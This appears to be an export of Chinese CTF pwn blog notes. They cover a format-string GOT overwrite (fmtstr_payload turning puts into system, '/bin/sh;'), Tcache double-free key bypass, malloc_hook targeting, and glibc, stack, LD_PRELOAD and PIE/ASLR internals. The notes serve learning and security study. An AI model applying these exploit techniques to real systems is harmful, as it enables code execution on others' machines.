fflush实际是调用vtable中的函数_IO_new_file_sync，这个函数的源码如图： （/glibc-2.23/libio/fileops.c:867） int _IO_new_file_sync (_IO_FILE *fp) { _IO_ssize_t delta; int retval = 0; /* char* ptr = cur_ptr(); */ if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) if (_IO_do_flush(fp)) return EOF;//end of file delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end; if (delta != 0) { #ifdef TODO if (_IO_in_backup (fp)) delta -= eGptr () - Gbase (); #endif _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1); if (new_pos != (_IO_off64_t) EOF) fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr; #ifdef ESPIPE else if (errno == ESPIPE) ; /* Ignore error from unseekable devices. */ #endif else retval = EOF; } if (retval != EOF) fp-&gt;_offset = _IO_pos_BAD; /* FIXME: Cleanup - can this be shared? */ /* setg(base(), ptr, ptr); */ return retval; } libc_hidden_ver (_IO_new_file_sync, _IO_file_sync) 虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。 pwntools与缓冲区机制某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。 为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见pwntools源码剖析（1）–以源码的角度分析io交互原理 %ms？从缓冲区的研究回到程序的简单逻辑分析上。 __isoc99_scanf(\"%ms\", &amp;format); 接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里） 然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。 漏洞利用因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。 那么如何打印这个flag呢？ 我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。 flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。 这时候就需要计算这个flag字符串与栈顶的偏移。 ![截屏2021-10-26 下午10.35.39](/Users/rin/Library/Application Support/typora-user-images/截屏2021-10-26 下午10.35.39.png) 显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。 利用%n$s打印参数，即可获得flag。 4)例2经过刚才的开胃菜，我们总算进入了正题。 一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。 但是如果需要修改函数的got表，我们需要满足几个条件： 知道需要修改的函数的真实地址。 需要想办法改写函数的got表。 一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（ 回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子 cctf pwn3程序分析 程序逻辑分析还是先进行一个简单的逻辑分析。 首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。 所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。 当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。 首先我们确定字符串偏移。 gdb动调的一些坑用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成 ERROR: Could not find ELF base! 原因详见摆烂第四天–gdb附加调试的一些黑魔法的2.1节。 因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。 等问题解决了在再来调。 tmp = 'sysbdmin' name = \"\" for i in tmp: name += chr(ord(i) - 1) ## password def password(): sh.recvuntil('Name (ftp.hacker.server:Rainism):') sh.sendline(name) 绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。 这样就有了代码中的公式。 当我们绕过了密码，然后就需要打印puts函数的真实地址。 打印真实地址，第一步需要找到格式化字符串在栈中的偏移。 关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。 原理参见：格式化字符串偏移计算原理 这里的偏移是8 # get the addr of puts puts_got = pwn3.got['puts'] log.success('puts got : ' + hex(puts_got)) put(b'1111', b'%8$s' + p32(puts_got)) puts_addr = u32(get('1111')[:4]) 然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。 这里%8$s' + p32(puts_got)应该是先把puts的got表传进去，然后再通过%8$s打印。 然后接收信息，就是puts的got表。 然后就是经典rop的确定libc基址和system地址，比较套路。 下一个关键点是 payload = fmtstr_payload(7, {puts_got: system_addr}) put('/bin/sh;', payload) sh.recvuntil('ftp&gt;') sh.sendline('get') sh.recvuntil('enter the file name you want to get:') ##gdb.attach(sh) sh.sendline('/bin/sh;') ​ 这里其实主要的问题都是被fmtstr_payload函数解决了。 ​ 这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。 ​ 关于函数是如何实现的，可以参见另外一篇笔记。格式化字符串偏移计算原理 最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。 ​ ​ 这个题的调试部分才是大头，一点一点把问题解决吧。 调试部分​ 思路和exp都很清楚的情况下，我们尝试对题目进行调试。 参考缓冲区机制详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） difference between %ms and %s scanf 格式化字符串 [格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)","categories":[],"tags":[{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"}]},{"title":"简单的汇编语言复习","slug":"再探汇编语言","date":"2021-10-13T09:25:43.372Z","updated":"2021-11-05T06:41:34.115Z","comments":true,"path":"2021/10/13/再探汇编语言/","link":"","permalink":"https://fuurinko.github.io/2021/10/13/%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","excerpt":"","text":"1）寻址1/直接寻址mov rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。 2/间接寻址间接在使用指针以及解引用的形式 mov [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。 3/比例寻址例如在数组遍历中 .data arrayD 1,2,3,4 .code mov esi,3 mov eax,arrayD[esi*4] ;eax = 4 其中，比例因子“4”代表数组的元素个数，esi的值代表下标。 2）段寄存器其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h 3）基础指令1/数据传输mov为了实现各种数据的传输，mov还有一下几种派生指令 movzx对目的操作数进行全0拓展并且复制。 movsx同上，但是是用1拓展而不是0。 与数据传输相关的指令还有很多，以后待补充。 2/与数据相关的运算符和伪指令offset返回一个偏移量 align将一个变量对齐到边界。 ps：对于cpu来说，处理偶地址速度会快于奇地址。 ptr重写一个已经被声明过操作数的大小类型。 type返回变量单个元素的大小 lengthof计算数组中元素的个数 sizeof返回lengthof和type的乘积","categories":[],"tags":[{"name":"asm Primary","slug":"asm-Primary","permalink":"https://fuurinko.github.io/tags/asm-Primary/"}]},{"title":"简单的函数调用栈基础","slug":"再探函数调用栈","date":"2021-10-12T11:39:41.667Z","updated":"2021-11-05T06:40:59.849Z","comments":true,"path":"2021/10/12/再探函数调用栈/","link":"","permalink":"https://fuurinko.github.io/2021/10/12/%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/","excerpt":"","text":"1）前言stack_pro力求从最底层的角度深究每一道简单的栈溢出题背后的原理。而第一章则从栈溢出的理论基础–函数调用栈开始。 2）函数调用栈从一个简单的程序入手。 程序来自你邮萌新赛pwn1-人类补习计划。 ​ 可以看到对栈空间进行一个初始化的操作的三行关键代码。 push rbp mov rbp, rsp sub rsp, 30h 然后就是人神共愤的函数调用栈环节。 rbp ： 栈基址指针寄存器 。 rsp ： 栈顶指针寄存器。 ​ 之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。 ​ 并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。 ​ 值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。 ​ ebp也就是s的位置，很显然在esp之下。 ​ 然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。 主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。 这段话说得非常玄学，而csapp中说得就非常简单清晰 当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。 ​ 还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。 ​ 那么直接从动态调试的角度来研究函数调用栈。 ​ 关于压栈的一些传参方式，可以参见格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。 当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。 此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。 可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。 tbc","categories":[],"tags":[{"name":"asm Primary","slug":"asm-Primary","permalink":"https://fuurinko.github.io/tags/asm-Primary/"}]},{"title":"main_arena与多线程","slug":"main_arana 与多线程","date":"2021-08-20T01:58:00.000Z","updated":"2021-10-29T06:01:18.616Z","comments":true,"path":"2021/08/20/main_arana 与多线程/","link":"","permalink":"https://fuurinko.github.io/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[],"tags":[{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"}]},{"title":"ubuntu加载不同版本libc","slug":"ubuntu加载不同版本libc","date":"2021-08-17T02:53:00.000Z","updated":"2021-10-29T06:01:03.125Z","comments":true,"path":"2021/08/17/ubuntu加载不同版本libc/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","excerpt":"","text":"1）review 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。 然后我就是这样一步一步地变得不会调试的。 但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。 呜呜呜，我居然一直忽略了它的灵魂 所以这一次我一定要解决掉这个问题。 之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。 目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。 2）原理在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。 但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。 1）LD_PRELOAD首先就是我们在脚本前加载的LD_PRELOAD这个东西。一般的用法是env={\"LD_PRELOAD\":libc_path} 它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。 这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 换句话说我们可以通过指定这个环境变量来指定特定的libc版本。 2）LD_LIBRARY_PATH和LIBRARY_PATHLD_LIBRARY_PATH用于在程序加载运行期间查找动态链接库时指定除了系统默认路径之外的其他路径. LIBRARY_PATH环境变量用于在程序编译期间查找动态链接库时指定查找共享库的路径 其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。 并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以LD_PRELOAD还是比较常见。 相关（？）环境变量大概就这么多，然后是某些特殊的段。 1） PT_INTERP储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。 我们可以修改这个段的内容来指定我们需要的链接器。 汇总综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。 准备好了以后我们通过脚本将题目PT_INTERP段修改，然后通过LD_PRELOAD指定我们需要的libc的路径即可。 实际操作我们以lonelywolf为例。 有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。 参考LD_PRELOAD的偷梁换柱之能","categories":[],"tags":[{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"}]},{"title":"Tcahce学习","slug":"Tcache学习","date":"2021-08-17T02:53:00.000Z","updated":"2021-10-29T06:00:49.343Z","comments":true,"path":"2021/08/17/Tcache学习/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/Tcache%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Tcahce学习0）review说是Tcache学习，实际上是lonelywolf的复现。 网上wp都是神仙写的，一点也不萌新友好。我都看不懂（） 打开题发现这个菜单题好常规。 但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。 具体的参考可以看glibc2.31下的新double free手法/字节跳动pwn题gun题解。但是在这道题里面充其量算一个trick而不是核心考点。 1）漏洞点unsigned __int64 delete() { __int64 v1; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, \"Index: \"); __isoc99_scanf(&amp;number, &amp;v1); if ( !v1 &amp;&amp; buf ) free(buf); return __readfsqword(0x28u) ^ v2; } 漏洞点。经典uaf。 之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。 while ( 1 ) { read(0, v0, 1uLL); if ( *v0 == '\\n' ) break; if ( ++v0 == v1 ) return __readfsqword(0x28u) ^ v4; } *v0 = 0; 然后有一个比较怪的点就是这里的 __readfsqword();。很明显他是一个和读取有关的函数，但是ida根本点不进去。 后面我才知道这个函数是和canary保护有关。 根据微软官方文档…这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。 但是好像说了和没说一样。 回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。Canary安全机制原理实战分析 ![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png) 2）漏洞利用1）Tcache double free之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。 虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。 add(0,0x68) free(0) gdb.attach(p) pause() 首先先分配再释放一下，看看这个题具体的内存分布有什么特点。 pwndbg&gt; hea Allocated chunk | PREV_INUSE Addr: 0x55e9c994c000 Size: 0x251 Free chunk (tcache) | PREV_INUSE Addr: 0x55e9c994c250 Size: 0x71 fd: 0x00 Top chunk | PREV_INUSE Addr: 0x55e9c994c2c0 Size: 0x20d41 pwndbg&gt; bin tcachebins 0x70 [ 1]: 0x55e9c994c260 ◂— 0x0 fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x0 smallbins empty largebins empty 之前一直不是很清楚 Allocated chunk | PREV_INUSE Addr: 0x55e9c994c000 Size: 0x251 这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。 然后这边 0x70 [ 1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk， pwndbg&gt; x/300gx 0x562fcfd39000 0x562fcfd39000: 0x0000000000000000 0x0000000000000251 0x562fcfd39010: 0x0000010000000000 0x0000000000000000 0x562fcfd39020: 0x0000000000000000 0x0000000000000000 0x562fcfd39030: 0x0000000000000000 0x0000000000000000 0x562fcfd39040: 0x0000000000000000 0x0000000000000000 0x562fcfd39050: 0x0000000000000000 0x0000000000000000 0x562fcfd39060: 0x0000000000000000 0x0000000000000000 0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260 这是控制堆块的部分结构 0x562fcfd39010: 0x0000010000000000 0x0000000000000000中，1说明只有一个Tcache。 T擦车堆块的首地址也记录在内。从0x562fcfd39050开始分别记录0x20到0x70的Tcache chunk的首地址，比如0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260,记录的就是0x70大小chunk的首地址。 喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。 pwndbg&gt; x/20gx 0x56533012f250 0x56533012f250: 0x0000000000000000 0x0000000000000071 0x56533012f260: 0x0000000000000000 0x000056533012f010 我们到Tcache的地址中看一看，会发现0x56533012f260: 0x0000000000000000 0x000056533012f010处的0x000056533012f010，这是一个key值。 2.29下Tcahce double free的检测之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是 对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry) typedef struct tcache_entry { struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段 } tcache_entry; 也就是所谓的key对应的就是chunk的bk字段。 当chunk被free，放入Tcache链表时，操作如下。 static __always_inline void tcache_put(mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加 } 然后进行free操作 size_t tc_idx = csize2tidx(size); //只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) { /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 { tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(\"free(): double free detected in tcache 2\"); } if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 { tcache_put(p, tc_idx); return; } } 源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。 大致是 add(0,0x78) free(0) edit(0,b\"aaaa\") free(0) show(0) 再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。 然后我们需要构造出unsortedbin chunk、 但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。 那么有什么办法能构造出unsortedbin呢？回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？ 如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？ 然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。 总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。 然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。 调试接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。 但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。 Tcache 利用不是学习不是学习不是学习， 例题是lctf2018的easyheap。 漏洞点一个又明显又不明显的漏洞、来自于输入后会把chunk_ptr置为0。 然后联想到malloc的内存分配机制，如果我们malloc一个16*n+8型的chunk，由于ptmalloc的内存复用机制，我们可以利用这个置零的漏洞使得物理相邻的下一个chunk的prevsize位包括previnuse位为0。然后构造堆叠。 unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2) { signed int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( a2 ) { while ( 1 ) { read(0, &amp;a1[v3], 1uLL); if ( a2 - 1 &lt; (unsigned int)v3 || !a1[v3] || a1[v3] == 10 ) break; ++v3; } a1[v3] = 0; a1[a2] = 0;//loophole } else { *a1 = 0; } return __readfsqword(0x28u) ^ v4; } 然后又注意到我们最多只能分配十个堆块，除去需要填满Tcache的七个堆块，也就是我们只能分配十个相同大小的堆块。 在完成这道题之前我们需要先理解unsortedbin 泄漏libc的原理。 包括ciscn lonelywolf也是利用到了这一点。 参考2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分 glibc2.31下的新double free手法/字节跳动pwn题gun题解 CISCN2021 lonelywolf","categories":[],"tags":[{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"}]},{"title":"ELF文件下对于PIE保护和ASLR的重新认识","slug":"ELF文件下对于PIE保护和ASLR的重新认识","date":"2021-08-13T07:06:00.000Z","updated":"2021-10-29T06:00:02.299Z","comments":true,"path":"2021/08/13/ELF文件下对于PIE保护和ASLR的重新认识/","link":"","permalink":"https://fuurinko.github.io/2021/08/13/ELF%E6%96%87%E4%BB%B6%E4%B8%8B%E5%AF%B9%E4%BA%8EPIE%E4%BF%9D%E6%8A%A4%E5%92%8CASLR%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/","excerpt":"","text":"ELF文件下对于PIE保护和ASLR的重新认识0）​ 复现红色高跟鞋的时候，在ida修复swithc结构的时候碰见了一个问题。因为题目的源文件是有pie保护的，所以ida中的地址是很难看的随机化模式。虽然这些随机化的地址对于我们patch文件毫无影响，但是就是突发奇想，看看能不能找到方法来通过patch将elf文件的pie保护给禁用。 1）​ 如果用010editor打开一个PE文件，我们能够很方便的通过修改PE头来禁用掉Windows程序的ASLR保护。这是因为程序本身其实并不是位置无关的。 ASLR在PE文件上的开启与否实际上就是PE头上标识符的区分，总的来说ASLR是操作系统的功能，而不是程序本身的特性，以ASLR ON 编译，也只是给程序加上了能被ASLR保护识别的标识符。所以我们只需要patch掉这个标识符，就能够改变程序的地址随机化状态。 也正是在寻找方法的过程中，我逐渐认识到虽然PIE保护和ASLR表现形式都是地址随机化，但是两者的原理以及实现的方式并不一样，甚至大相径庭。 在维基百科上，我们能够清楚地看到PIE的全称是Position-independence Executable，位置无关可执行文件。 这个概念并不是很常见，相对更为常见的是PIC，Position-independence Code，位置无关代码。 PIC和PIE只差了一个字母，意思也相近。但PIC更多的是在重定位中被提及。源码通过汇编器生成可重定位目标文件，此时它的代码就是位置无关，从0开始的，PIE和PIC的概念相近，当编译完成，可执行文件的便是位置无关了，我们无法改变这一点，也就是说，被PIE保护的文件，并不是通过给头文件加上标识符，使系统开启或关闭随机，而是文件本身便是位置无关吗，是随机的。 ​ 然而，虽然文件本身是位置无关的，但是实际地址是否随机，还是要看进程中aslr是否开启，如果将进程aslr关闭，那么调试时我们看到的地址依旧不是随机的。这里主要涉及到重定位的相关知识，之后会写一篇笔记来试图深入系统重定位过程与地址随机化之间的关系。","categories":[],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"IO_FILE学习","slug":"io_file","date":"2021-08-09T07:44:00.000Z","updated":"2021-10-29T06:01:38.955Z","comments":true,"path":"2021/08/09/io_file/","link":"","permalink":"https://fuurinko.github.io/2021/08/09/io_file/","excerpt":"","text":"io_file学习笔记 0）reviewglibc定义了_IO_FILE这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的_IO_FILE_plus结构 结构源码如下 struct _IO_FILE_plus { _IO_FILE file; IO_jump_t *vtable; } 这个结构包含了一个叫vtable的指针，指向实现io函数各种功能的真正函数。 以fread为例子简述io_file结构调用的流程 freadfread真正功能的实现在子函数_IO_sgetn中。 下面是_IO_sgetn的源码。 _IO_size_t _IO_sgetn (fp, data, n) _IO_FILE *fp; void *data; _IO_size_t n; { return _IO_XSGETN (fp, data, n); } 实际上也是先定义一堆变量然后内部再调用另外一个函数。 也就是_IO_XSGETN。 这个函数并不简单，它是_IO_FILE_plus.vtable 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。 vtable也是一个指针，指向结构体_IO_jump_t _IO_jump_t源码如下 struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ 